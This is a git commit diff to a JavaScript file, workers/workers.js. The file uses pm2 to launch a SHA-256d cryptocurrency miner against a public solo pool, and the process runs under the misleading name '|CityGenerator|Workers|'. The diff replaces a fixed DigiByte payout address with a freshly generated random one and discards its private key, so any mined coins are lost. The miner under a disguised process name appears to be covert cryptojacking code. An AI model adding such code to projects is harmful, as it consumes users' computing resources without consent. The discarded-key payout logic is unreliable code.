5a68739e64635a56a0736a6bf168b565acf72bbc
UniversalBit <lazzaragiuliano@gmail.com>
2025-05-08 19:30:06 +0200

    Add files via upload

--- workers/workers.js
+++ workers/workers.js
@@ -1,25 +1,37 @@
-const pm2 = require('pm2')
+const pm2 = require('pm2');
+const digibyte = require('digibyte-js');
+
+/**
+ * Generates a random Digibyte address.
+ * @returns {string} The generated Digibyte address.
+ */
+function generateRandomAddress() {
+    const privateKey = new digibyte.PrivateKey();
+    const address = privateKey.toAddress().toString();
+    return address;
+}
+
 pm2.connect(function(err) {
   if (err) {
-    console.error(err)
-    process.exit(2)
+    console.error(err);
+    process.exit(2);
   }
-  
+
+  const randomAddress = generateRandomAddress(); // Generate a random Digibyte address
+
   pm2.start({
-    script    : './minerd -a sha256d -o stratum+tcp://eu1.solopool.org:8004 --userpass=D82v9SnHsUdrPdsr3ENgmH5HQBUfSyZiUs:x',
+    script    : `./minerd -a sha256d -o stratum+tcp://eu1.solopool.org:8004 --userpass=${randomAddress}:x`,
     args      : '',
     name      : '|CityGenerator|Workers|'
-},
-function(err, apps) {
-if (err) {
-      console.error(err)
-      return pm2.disconnect()
+  },
+  function(err, apps) {
+    if (err) {
+      console.error(err);
+      return pm2.disconnect();
     }
 
     pm2.list((err, list) => {
-      console.log(err, list)
-
-
-    })
-  })
-})
+      console.log(err, list);
+    });
+  });
+});
